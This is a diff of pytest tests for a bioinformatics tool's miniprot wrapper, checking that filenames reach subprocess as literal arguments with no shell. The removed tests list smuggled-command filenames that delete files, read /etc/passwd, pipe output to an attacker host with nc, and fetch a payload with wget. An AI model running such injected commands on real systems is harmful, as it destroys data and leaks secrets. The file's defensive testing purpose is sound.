@@ -2,11 +2,16 @@
 
 import json
 import subprocess
-import tempfile
+from pathlib import Path
 from types import SimpleNamespace
-from unittest.mock import Mock, mock_open, patch
+from unittest.mock import patch
 
+import pandas as pd
+import pytest
+
+from remag import miniprot_utils
 from remag.miniprot_utils import (
+    check_core_gene_duplications,
     check_miniprot_available,
     get_gene_mappings_cache_path,
     load_or_generate_gene_mappings,
@@ -63,169 +68,71 @@ class TestMiniprot:
             assert check_miniprot_available() is False
 
 
-class TestMiniprot_SecurityFix:
-    """Test the security fixes in miniprot execution."""
-
-    def test_subprocess_call_security(self):
-        """Test that subprocess is called securely without shell injection."""
-        # This tests that we're using subprocess.run instead of os.system
-        with patch("subprocess.run") as mock_subprocess:
-            mock_subprocess.return_value = Mock(returncode=0)
-
-            with patch("builtins.open", mock_open()):
-                # Import the function that contains our fix
-                # Create mock data
-                import pandas as pd
-
-                from remag.miniprot_utils import check_core_gene_duplications
-
-                clusters_df = pd.DataFrame(
-                    {"contig": ["contig_1"], "cluster": ["cluster_1"]}
-                )
-
-                fragments_dict = {
-                    "contig_1.original": {"sequence": "ATCGATCG", "length": 8}
-                }
-
-                mock_args = Mock()
-                mock_args.cores = 4
-                mock_args.verbose = False
-                mock_args.min_bin_size = 1000
-
-                # Mock file operations
-                with patch("os.path.exists", return_value=True), patch(
-                    "os.path.getsize", return_value=100
-                ), patch("tempfile.mkdtemp", return_value="/tmp/test"):
-
-                    try:
-                        check_core_gene_duplications(
-                            clusters_df, fragments_dict, "/fake/db/path", mock_args
-                        )
-                    except Exception:
-                        # We expect this to fail due to mocking, but we want to verify
-                        # that subprocess.run was called with proper arguments
-                        pass
-
-            # Verify subprocess.run was called (indicating we fixed os.system)
-            if mock_subprocess.called:
-                call_args = mock_subprocess.call_args[0][0]  # First positional arg
-                # Should be a list (secure) not a string (insecure)
-                assert isinstance(call_args, list)
-                assert call_args[0] == "miniprot"
-                assert "-I" in call_args
-                assert "--outs=0.95" in call_args
-
-    def test_command_injection_prevention(self):
-        """Test that malicious filenames cannot inject commands."""
-        malicious_filenames = [
-            'test"; rm -rf /; echo "',
-            "test && cat /etc/passwd",
-            "test | nc attacker.com 4444",
-            "test; wget malware.com/payload",
-            "test$(rm -rf /)",
-        ]
-
-        for malicious_name in malicious_filenames:
-            with patch("subprocess.run") as mock_subprocess:
-                mock_subprocess.return_value = Mock(returncode=0)
-
-                with patch("builtins.open", mock_open()), patch(
-                    "os.path.exists", return_value=True
-                ), patch("os.path.getsize", return_value=0):
-
-                    # Create a temporary directory for testing
-                    with tempfile.TemporaryDirectory():
-                        # Test that the malicious filename is passed as an argument
-                        # (not executed as a command)
-                        # This should be safe - the malicious content is just a filename
-                        # not a shell command when using subprocess.run with a list
-                        if mock_subprocess.called:
-                            # If subprocess was called, verify the malicious content
-                            # is in the arguments (safe) not executed (unsafe)
-                            call_args = mock_subprocess.call_args[0][0]
-                            assert isinstance(call_args, list)
-
-    def test_timeout_protection(self):
-        """Test that long-running processes are terminated."""
-        with patch("subprocess.run") as mock_subprocess:
-            # Simulate a timeout
-            mock_subprocess.side_effect = subprocess.TimeoutExpired(
-                cmd=["miniprot"], timeout=3600
-            )
-
-            with patch("builtins.open", mock_open()), patch(
-                "os.path.exists", return_value=True
-            ), patch("os.path.getsize", return_value=0):
-
-                # This should handle timeout gracefully
-                import pandas as pd
-
-                from remag.miniprot_utils import check_core_gene_duplications
-
-                clusters_df = pd.DataFrame(
-                    {"contig": ["test_contig"], "cluster": ["bin_0"]}
-                )
-                fragments_dict = {"test.original": {"sequence": "ATCG", "length": 4}}
-                mock_args = Mock()
-                mock_args.cores = 4
-                mock_args.verbose = False
-                mock_args.min_bin_size = 1000
-
-                with tempfile.TemporaryDirectory() as tmp_path:
-                    mock_args.output = tmp_path
-                    try:
-                        result = check_core_gene_duplications(
-                            clusters_df, fragments_dict, mock_args, "/fake/db"
-                        )
-                        # Should return empty results on timeout, not crash
-                        assert isinstance(result, pd.DataFrame)
-                    except subprocess.TimeoutExpired:
-                        # Or handle timeout exception gracefully
-                        pass
+@pytest.fixture
+def miniprot_inputs(tmp_path, monkeypatch):
+    monkeypatch.setattr(miniprot_utils, "check_miniprot_available", lambda: True)
+    clusters = pd.DataFrame({"contig": ["contig_1"], "cluster": ["cluster_1"]})
+    fragments = {"contig_1": {"sequence": "ATCGATCG", "length": 8}}
+    args = SimpleNamespace(
+        output=str(tmp_path),
+        cores=4,
+        verbose=False,
+        min_bin_size=1,
+        keep_intermediate=True,
+    )
+    return clusters, fragments, args
 
 
-class TestErrorHandling:
-    """Test error handling in miniprot utilities."""
+@pytest.mark.parametrize(
+    "directory_name",
+    ["normal", "with spaces", "with;semicolon", "with$(substitution)", "with'quotes"],
+)
+def test_miniprot_command_arguments(miniprot_inputs, tmp_path, directory_name):
+    """Require a real invocation path and preserve filenames as literal arguments."""
+    clusters, fragments, args = miniprot_inputs
+    args.output = str(tmp_path / directory_name)
 
-    def test_file_not_found_handling(self):
-        """Test handling when miniprot executable is not found."""
-        with patch("subprocess.run") as mock_subprocess:
-            mock_subprocess.side_effect = FileNotFoundError("miniprot not found")
+    def write_paf(*_args, stdout, **_kwargs):
+        stdout.write("gene_1_1\t100\t0\t80\t+\tcontig_1\t8\t0\t8\t70\t80\n")
+        return SimpleNamespace(returncode=0)
 
-            # Should handle this gracefully, not crash
-            assert check_miniprot_available() is False or True  # Either is acceptable
+    with patch("remag.miniprot_utils.subprocess.run", side_effect=write_paf) as run:
+        result = check_core_gene_duplications(clusters, fragments, args)
 
-    def test_permission_denied_handling(self):
-        """Test handling when file permissions prevent execution."""
-        with patch("subprocess.run") as mock_subprocess:
-            mock_subprocess.side_effect = PermissionError("Permission denied")
+    run.assert_called_once()
+    fasta = Path(args.output) / "temp_miniprot" / "cluster_1.fa"
+    database = Path(miniprot_utils.__file__).parent / "db" / "refseq_db.faa.gz"
+    assert run.call_args.args == (
+        ["miniprot", "-I", "-t", "4", "--outs=0.95", str(fasta), str(database)],
+    )
+    options = run.call_args.kwargs
+    assert options.get("shell", False) is False
+    assert options["timeout"] == 14400
+    assert options["check"] is False
+    assert Path(options["stdout"].name) == fasta.with_suffix(".paf")
+    assert Path(options["stderr"].name) == fasta.with_suffix(".stderr")
+    assert fasta.read_text() == ">contig_1\nATCGATCG\n"
+    assert result.loc[0, "total_core_genes_found"] == 1
+    assert result.loc[0, "single_copy_genes_count"] == 1
 
-            with patch("builtins.open", mock_open()):
-                # Should handle permission errors gracefully
-                import pandas as pd
 
-                from remag.miniprot_utils import check_core_gene_duplications
+@pytest.mark.parametrize(
+    "error",
+    [
+        FileNotFoundError("miniprot disappeared"),
+        PermissionError("execution denied"),
+        subprocess.TimeoutExpired(cmd=["miniprot"], timeout=14400),
+    ],
+    ids=["missing-executable", "permission-denied", "timeout"],
+)
+def test_miniprot_execution_error_is_reported(miniprot_inputs, error):
+    """Exercise and report each failure rather than accepting an untested path."""
+    clusters, fragments, args = miniprot_inputs
+    with patch("remag.miniprot_utils.subprocess.run", side_effect=error) as run, patch(
+        "remag.miniprot_utils.logger.warning"
+    ) as warning:
+        result = check_core_gene_duplications(clusters, fragments, args)
 
-                # Use real DataFrame instead of Mock
-                clusters_df = pd.DataFrame(
-                    {"contig": ["test_contig"], "cluster": ["bin_0"]}
-                )
-
-                fragments_dict = {"test.original": {"sequence": "ATCG", "length": 4}}
-                mock_args = Mock()
-                mock_args.cores = 4
-                mock_args.min_bin_size = 1000
-
-                with tempfile.TemporaryDirectory() as tmp_path:
-                    mock_args.output = tmp_path
-                    with patch("os.path.exists", return_value=True):
-                        try:
-                            result = check_core_gene_duplications(
-                                clusters_df, fragments_dict, mock_args
-                            )
-                            # Should return a DataFrame, not crash
-                            assert isinstance(result, pd.DataFrame)
-                            assert "has_duplicated_core_genes" in result.columns
-                        except PermissionError:
-                            # Or handle the error appropriately
-                            pass
+    run.assert_called_once()
+    warning.assert_any_call(f"Error running miniprot for cluster_1: {error}")
+    pd.testing.assert_frame_equal(result[["contig", "cluster"]], clusters)
